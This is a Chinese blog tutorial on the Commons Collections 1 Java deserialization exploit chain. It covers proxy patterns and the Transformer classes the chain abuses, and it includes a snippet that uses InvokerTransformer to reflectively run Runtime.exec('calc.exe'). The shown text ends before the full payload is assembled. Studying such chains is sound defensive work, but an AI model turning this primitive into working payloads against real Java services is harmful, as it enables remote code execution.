<!DOCTYPE html>
<html>

	<head>
		
<title>Java反序列化-Commons Collections1利用链分析-信息安全博客</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="shortcut icon" type="image/x-icon" href="/image/favicon1.ico">


<meta name="keywords" content="java安全,cc链,">
<meta name="description" content="">


<script src="/js/jquery.min.js"></script>


	<meta name="generator" content="Hexo 5.4.0"></head>

	<body>
		
<link rel="stylesheet" href="/css/page.css">


<link rel="stylesheet" href="/css/page_cente.css">


<link rel="stylesheet" href="/css/atom-one-dark.css">


<link rel="stylesheet" href="/css/header.css">

	<div class="header">
		<div class="header-top">
			<div class="h-left">
				<a href="/">
					<img src="/image/logo.png" alt="Quiet">
				</a>
			</div>
			<div class="h-right">
				<ul>
					
						
								<li>
									<a href="/">
										主页
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/archives">
										文章
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/categories">
										分类
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/tags">
										标签
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/links">
										友情链接
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/about">
										关于
									</a>
									<span class="dot"></span>
								</li>
								
									
				</ul>
			</div>
			<div class="h-right-close">
				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
					<path fill="none" d="M0 0h24v24H0z" />
					<path d="M3 4h18v2H3V4zm0 7h18v2H3v-2zm0 7h18v2H3v-2z" fill="rgba(68,68,68,1)" />
				</svg>
			</div>
		</div>
	</div>
	<div class="sidebar">
    <div class="topo">
        <h2>TRRQ</h2>
    </div>
    <ul>
        
        <li>
            <a href="/">主页</a>
        </li>
        
        <li>
            <a href="/archives">文章</a>
        </li>
        
        <li>
            <a href="/categories">分类</a>
        </li>
        
        <li>
            <a href="/tags">标签</a>
        </li>
        
        <li>
            <a href="/links">友情链接</a>
        </li>
        
        <li>
            <a href="/about">关于</a>
        </li>
        
    </ul>
    <div class="my_foot">
        
        <a target="_blank" rel="noopener" href="https://github.com/qiaobug">
            <img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
        </a>
        
    </div>
</div>
<div class='shelter'
    style='cursor: pointer;display: none; position: fixed;left: 0;top: 0; right: 0;bottom: 0;background-color: #333;opacity:0.5;z-index: 108;'>
</div>
<style>
    .sidebar {
        width: 0;
        height: 100%;
        position: fixed;
        top: 0;
        right: 0;
        bottom: 0;
        background: #fff;
        z-index: 999;
        text-align: center;
        box-shadow: -6px 0 20px rgba(98, 94, 94, .815)
    }

    .topo {
        width: 100%;
        height: 200px;
        background: url(https://api.ixiaowai.cn/gqapi/gqapi.php) no-repeat;
        background-size: 100% 100%;
        position: relative;
        display: flex;
        align-items: flex-end
    }

    .topo h2 {
        color: #fff;
        z-index: 1;
        position: relative;
        margin: 0 0 10px 10px;
        font-size: 1.2em;
        box-sizing: border-box
    }

    .topo:before {
        content: '';
        background-image: url(/image/pattern.png);
        background-repeat: repeat;
        height: 100%;
        left: 0;
        position: absolute;
        top: 0;
        width: 100%;
        z-index: 1
    }

    .sidebar ul {
        width: 100%;
        margin-top: 50px
    }

    .sidebar ul li {
        height: 50px;
        list-style: none;
        font-size: 1.2em;
        text-align: right;
        margin-right: 10px
    }

    .sidebar ul li a {
        display: grid;
        color: #5d606a;
        text-overflow: ellipsis;
        width: 100%;
        text-decoration: none
    }

    .my_foot {
        width: 100%;
        padding: 10px;
        margin-bottom: 10px;
        position: absolute;
        bottom: 0
    }

    .my_foot a {
        text-decoration: none;
        margin-right: 10px;
        display: inline-block
    }

    .my_foot a img {
        width: 30px;
        height: 30px
    }
</style>

<script>
    $(function () { $('.h-right-close>svg').click(function () { $('.sidebar').animate({ width: "66%" }, 500); $('.shelter').fadeIn("slow") }); $('.shelter').click(function (e) { $('.sidebar').animate({ width: "0" }, 500); $('.shelter').fadeOut("slow") }) })
</script>
		<script>
			$(function () { $(window).scroll(function () { if ($(document).scrollTop() > 100) { $(".header-top").removeClass("header-move2"); $('.header-top').addClass('header-move1') } else { $(".header-top").removeClass("header-move1"); $('.header-top').addClass('header-move2') } }) });
		</script>
<div class="header-bg bg-content-img">
    <div class="bg-content">
        <ul class="tag">
            
            
            <li><a href="/tags/java安全">java安全</a></li>
            
            <li><a href="/tags/cc链">cc链</a></li>
            
            
        </ul>
        <h1>Java反序列化-Commons Collections1利用链分析</h1>
        <div class="article-info">
            <div class="article-author">
                
                <svg t="1604839279282" class="icon" viewBox="0 0 1024 1024" version="1.1"
                    xmlns="http://www.w3.org/2000/svg" p-id="2901" width="20" height="20">
                    <path
                        d="M513 956.3c-247.7 0-448-200.3-448-448S265.3 66.2 513 66.2s448 200.3 448 448-200.3 442.1-448 442.1z m0-830.9c-212.2 0-388.8 170.7-388.8 388.8C124.2 726.3 294.9 903 513 903c212.2 0 388.8-170.7 388.8-388.8S725.2 125.4 513 125.4z m0 430.2c-94.2 0-170.7-76.5-170.7-170.7S418.8 207.8 513 207.8s170.7 76.5 170.7 170.7S607.2 555.6 513 555.6z m0-289.1c-64.6 0-112 52.8-112 112s47.4 117.9 112 117.9 112-52.8 112-112-47.4-117.9-112-117.9z m0 689.8c-135.7 0-259-58.7-341.9-158.9l-11.8-17.8 11.8-17.8c76.5-117.9 206.2-188.5 347.8-188.5 135.7 0 265 64.6 341.9 182.6l11.8 17.8-11.8 17.8C778 897.1 648.7 956.3 513 956.3zM230.3 773.2C300.9 849.7 406.9 897 513 897c112 0 218.1-47.4 288.6-129.8-70.5-88.2-170.7-135.6-282.7-135.6s-218.1 53.3-288.6 141.6z"
                        p-id="2902" fill="#ffffff"></path>
                </svg>
                
                <span> <a href="">TRRQ</a></span>
                <p>2022-03-02 11:10:17</p>
            </div>
        </div>
    </div>
</div>
<div class="article-content">
    <div id="article" class="content">
        <h1 id="Java反序列化-Commons-Collections1利用链分析"><a href="#Java反序列化-Commons-Collections1利用链分析" class="headerlink" title="Java反序列化-Commons Collections1利用链分析"></a>Java反序列化-Commons Collections1利用链分析</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h3><p>代理模式的定义：就是被代理者没有能力或者不愿意做某件事，然后就需要一个人代理去完成某件事，这个人就是代理者</p>
<p><strong>代理模式的三个角色</strong></p>
<ol>
<li>被代理者</li>
<li>代理者</li>
<li>协议</li>
</ol>
</br>

<p><strong>代理模式的分类</strong></p>
<blockquote>
<p> java是动态的语言，反射是动态的特征</p>
</blockquote>
<ul>
<li>静态代理模式：表示代理类是实际存在的，可以使用代理类创建代理对象</li>
<li>动态代理模式：表示代理类实际上是不存在的，但是使用的JDK提供的一个java.lang.reflec.Proxy类动态生成代理对象</li>
</ul>
</br>

<p><strong>代理模式的业务需求</strong></p>
<p>ctfer想要获取flag，就需要借助一系列的工具将题目解出</p>
<ol>
<li>ctfer是被代理者</li>
<li>工具是代理者</li>
</ol>
</br>

<p>获取flag流程</p>
<ol>
<li>ctfer需要提供思路</li>
<li>工具需要借助思路解题</li>
<li>工具获取flag</li>
<li>ctfer提交flag</li>
</ol>
<h3 id="静态代理实现"><a href="#静态代理实现" class="headerlink" title="静态代理实现"></a>静态代理实现</h3><p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220302184130.png"></p>
</br>

<ol>
<li>定义接口（协议）</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> reflect;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 代理模式的协议</span><br><span class="hljs-comment"> * 解题的接口</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">SolveProblems</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">execute</span><span class="hljs-params">()</span></span>; <span class="hljs-comment">//执行操作方法</span><br>&#125;<br></code></pre></td></tr></table></figure>

</br>

<ol start="2">
<li>定义被代理角色-ctfer</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> reflect;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 代理模式的被代理者</span><br><span class="hljs-comment"> * Ctf选手</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ctfer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">SolveProblems</span> </span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 提交flag</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">execute</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;ctfer:提交flag到平台&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 提供的思路</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">idea</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;ctfer:提供思路：扫描备份文件，找到网页内的flag&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

</br>

<ol start="3">
<li>定义代理角色-工具</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> reflect;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 代理者</span><br><span class="hljs-comment"> * 工具</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Tools</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">SolveProblems</span></span>&#123;<br><br>    Ctfer ctfer;<br><br>    <span class="hljs-comment">//构造参数，用来获取ctfer的思路</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Tools</span><span class="hljs-params">(Ctfer ctfer)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.ctfer = ctfer;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">execute</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-comment">//ctf选手提供的思路执行工具</span><br>        ctfer.idea();<br>        System.out.println(<span class="hljs-string">&quot;工具:通过思路获取到备份文件,拿到了存flag的网页&quot;</span>);<br>        ctfer.execute();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<ol start="4">
<li>静态代理模式的使用</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> test.reflect;<br><br><span class="hljs-keyword">import</span> org.junit.jupiter.api.DynamicTest;<br><span class="hljs-keyword">import</span> org.junit.jupiter.api.Test;<br><span class="hljs-keyword">import</span> reflect.Ctfer;<br><span class="hljs-keyword">import</span> reflect.Tools;<br><span class="hljs-keyword">import</span> trrq.User;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 代理模式的使用</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProxyTest</span> </span>&#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 静态代理模式的使用</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">staticProxy</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-comment">//被代理对象</span><br>        Ctfer ctfer = <span class="hljs-keyword">new</span> Ctfer();<br>        <span class="hljs-comment">//代理对象</span><br>        Tools tools = <span class="hljs-keyword">new</span> Tools(ctfer);<br>        <span class="hljs-comment">//调用代理对象的方法</span><br>        tools.execute();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

</br>

<h3 id="动态代理实现"><a href="#动态代理实现" class="headerlink" title="动态代理实现"></a>动态代理实现</h3><p>如果想要实现动态代理，就需要使用JDK提供的Proxy类的newProxyInstance方法来实现，该方法返回代理对象（也就是上面静态模式写的tools工具）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@CallerSensitive</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">newProxyInstance</span><span class="hljs-params">(ClassLoader loader,</span></span><br><span class="hljs-params"><span class="hljs-function">                                      Class&lt;?&gt;[] interfaces,</span></span><br><span class="hljs-params"><span class="hljs-function">                                      InvocationHandler h)</span></span><br></code></pre></td></tr></table></figure>

<ul>
<li>ClassLoader loader表示<strong>被代理类</strong>的加载器</li>
<li>Class&lt;?&gt;[] interfaces 表示<strong>被代理类</strong>所有实现的接口</li>
<li>InvocationHandler h 表示执行处理接口，该接口还是一个函数式接口。在传递InvocationHandler类型参数的时候，必须实现里invoke方法，该方法就是返回方法执行的返回值</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> Throwable</span>;<br></code></pre></td></tr></table></figure>

<ul>
<li>Object proxy 表示代理对象，一般不用</li>
<li>Method method 表示代理方法的方法</li>
<li>Object[] args 表示代理对象调用的实际参数</li>
</ul>
</br>

<h4 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h4><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> test.reflect;<br><br><span class="hljs-keyword">import</span> org.junit.jupiter.api.DynamicTest;<br><span class="hljs-keyword">import</span> org.junit.jupiter.api.Test;<br><span class="hljs-keyword">import</span> reflect.Ctfer;<br><span class="hljs-keyword">import</span> reflect.SolveProblems;<br><span class="hljs-keyword">import</span> reflect.Tools;<br><span class="hljs-keyword">import</span> trrq.User;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 代理模式的使用</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProxyTest</span> </span>&#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 静态代理模式的使用</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">staticProxy</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-comment">//被代理对象</span><br>        Ctfer ctfer = <span class="hljs-keyword">new</span> Ctfer();<br>        <span class="hljs-comment">//代理对象</span><br>        Tools tools = <span class="hljs-keyword">new</span> Tools(ctfer);<br>        <span class="hljs-comment">//调用代理对象的方法</span><br>        tools.execute();<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 动态代理模式的使用</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">dynamicProxyWithoutArgsWithoutReturnValue</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-comment">//被代理对象</span><br>        <span class="hljs-keyword">final</span> Ctfer ctfer = <span class="hljs-keyword">new</span> Ctfer();<br>        <span class="hljs-keyword">final</span> Tools tools = <span class="hljs-keyword">new</span> Tools(ctfer);<br>        <span class="hljs-comment">//动态创建代理对象</span><br>        SolveProblems solveProblems = (SolveProblems) Proxy.newProxyInstance(Ctfer.class.getClassLoader(), Ctfer.class.getInterfaces(), <span class="hljs-keyword">new</span> InvocationHandler() &#123;<br>            <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                <span class="hljs-keyword">if</span> (method.getName().equals(<span class="hljs-string">&quot;execute&quot;</span>))&#123;<br>                    <span class="hljs-comment">//ctf选手提供的思路执行工具</span><br>                    ctfer.idea();<br>                    System.out.println(<span class="hljs-string">&quot;工具:通过思路获取到备份文件,拿到了存flag的网页&quot;</span>);<br>                    <span class="hljs-comment">//通过反射的方式调用被代理对象的方法，ctfer.execute()</span><br>                    method.invoke(ctfer);<br>                &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>            &#125;<br>        &#125;);<br>        solveProblems.execute();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>返回结果和静态代理是一样的</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220302220340.png"></p>
</br>

<p><strong>静态代理和动态代理的区别</strong></p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220302192729.png"></p>
</br>

<h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p>从注释上可以看到这个接口，是用来将一个对象转换为另一个对象的实现的仿函数接口</p>
<p>Transformer是一个接口，代实现的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Transformer</span>&lt;<span class="hljs-title">I</span>, <span class="hljs-title">O</span>&gt; </span>&#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 将输入对象（保持不变）转换为某个输出对象</span><br><span class="hljs-comment">     * Transforms the input object (leaving it unchanged) into some output object.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> input  the object to be transformed, should be left unchanged</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> a transformed object</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> ClassCastException (runtime) if the input is the wrong class</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException (runtime) if the input is invalid</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> FunctorException (runtime) if the transform cannot be completed</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function">O <span class="hljs-title">transform</span><span class="hljs-params">(I input)</span></span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>

</br>

<h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p>该类可以在一个元素被添加/删除/或是被修改时，会调用transform方法自动进行特定的修饰变换。也就是说，TransformedMap类中的数据发生改变时，可以自动对进行一些特殊的变换</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;<br>	<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;<br>	<span class="hljs-keyword">super</span>(map);<br>	<span class="hljs-keyword">this</span>.keyTransformer = keyTransformer;<br>	<span class="hljs-keyword">this</span>.valueTransformer = valueTransformer;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>TransformedMap下面有三个方法，并且都调用transform</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> Object <span class="hljs-title">transformKey</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>	<span class="hljs-keyword">if</span> (keyTransformer == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> object;<br>	&#125;<br>	<span class="hljs-keyword">return</span> keyTransformer.transform(object);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">protected</span> Object <span class="hljs-title">transformValue</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>	<span class="hljs-keyword">if</span> (valueTransformer == <span class="hljs-keyword">null</span>) &#123;<br>		<span class="hljs-keyword">return</span> object;<br>	&#125;<br>	<span class="hljs-keyword">return</span> valueTransformer.transform(object);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">protected</span> Object <span class="hljs-title">checkSetValue</span><span class="hljs-params">(Object value)</span> </span>&#123;<br>	<span class="hljs-keyword">return</span> valueTransformer.transform(value);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>从注释可以看出，当该类的setvalue方法调用时，会自动调用checkSetValue方法，该类的setvalue是继承与AbstractInputCheckedMapDecorator这个父类，我们后面可以了解到</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220303152525.png"></p>
<p>由于前面是这几个方法访问控制权限都是protected，而下面两个public方法调用到了上面的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">put</span><span class="hljs-params">(Object key, Object value)</span> </span>&#123;<br>    key = transformKey(key);<br>    value = transformValue(value);<br>    <span class="hljs-keyword">return</span> getMap().put(key, value);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">putAll</span><span class="hljs-params">(Map mapToCopy)</span> </span>&#123;<br>    mapToCopy = transformMap(mapToCopy);<br>    getMap().putAll(mapToCopy);<br>&#125;<br></code></pre></td></tr></table></figure>

</br>

<h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>首先该类继承了Transformer</p>
<p>函数是实现<code>transformer</code>接口的一个类,在该函数里面有一个构造函数,会传入我们的<code>Object</code>,在<code>transform</code>方法中又会将该<code>Object</code>返回</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> </span>&#123;<br>    <span class="hljs-keyword">super</span>();<br>    iConstant = constantToReturn;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123;<br>	<span class="hljs-keyword">return</span> iConstant;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getConstant</span><span class="hljs-params">()</span> </span>&#123;<br>	<span class="hljs-keyword">return</span> iConstant;<br>&#125;<br></code></pre></td></tr></table></figure>

</br>

<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>该类是通过反射创建新对象实例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">InvokerTransformer</span><span class="hljs-params">(String methodName)</span> </span>&#123;<br>	<span class="hljs-keyword">super</span>();<br>	iMethodName = methodName;<br>	iParamTypes = <span class="hljs-keyword">null</span>;<br>    iArgs = <span class="hljs-keyword">null</span>;<br>&#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;<br>	<span class="hljs-keyword">super</span>();<br>	iMethodName = methodName;<br>	iParamTypes = paramTypes;<br>    iArgs = args;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (input == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        Class cls = input.getClass();<br>        Method method = cls.getMethod(iMethodName, iParamTypes);<br>        <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br>            <br>    &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException ex) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; does not exist&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException ex) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; cannot be accessed&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException ex) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; threw an exception&quot;</span>, ex);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>尝试用InvokerTransformer反射编写Runtime.getRuntime.exec(“calc.exe”)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">InvokerTransformer invokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;);<br>invokerTransformer.transform(Runtime.getRuntime());<br></code></pre></td></tr></table></figure>

</br>

<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>有个构造函数，将Transformer类型的数组赋值给iTransformers</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>();<br>        iTransformers = transformers;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> T <span class="hljs-title">transform</span><span class="hljs-params">(T object)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> Transformer&lt;? <span class="hljs-keyword">super</span> T, ? extends T&gt; iTransformer : iTransformers) &#123;<br>        object = iTransformer.transform(object);<br>    &#125;<br>    <span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>前一个对象的transform返回的结果作为后一个对象的参数</p>
</br>

<h4 id="AbstractInputCheckedMapDecorator"><a href="#AbstractInputCheckedMapDecorator" class="headerlink" title="AbstractInputCheckedMapDecorator"></a>AbstractInputCheckedMapDecorator</h4><p>一个抽象基类，简化创建地图装饰器的任务，该类属于 <strong>JDK1.7</strong> 自带</p>
<p>可以看到当我们调用setValue就会去调用checkSetValue，AnnotationInvocationHandler类的readObject 方法中看到 <strong>setValue</strong> 方法的调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">setValue</span><span class="hljs-params">(Object value)</span> </span>&#123;<br>    value = parent.checkSetValue(value);<br>    <span class="hljs-keyword">return</span> entry.setValue(value);<br>&#125;<br></code></pre></td></tr></table></figure>

</br>

<h4 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h4><p>抽象基类，简化创建map修饰器的任务</p>
<p>我们找到rt.jar包可以通过Java Decompiler获取到关联源文件</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220303190958.png"></p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304222913.png"></p>
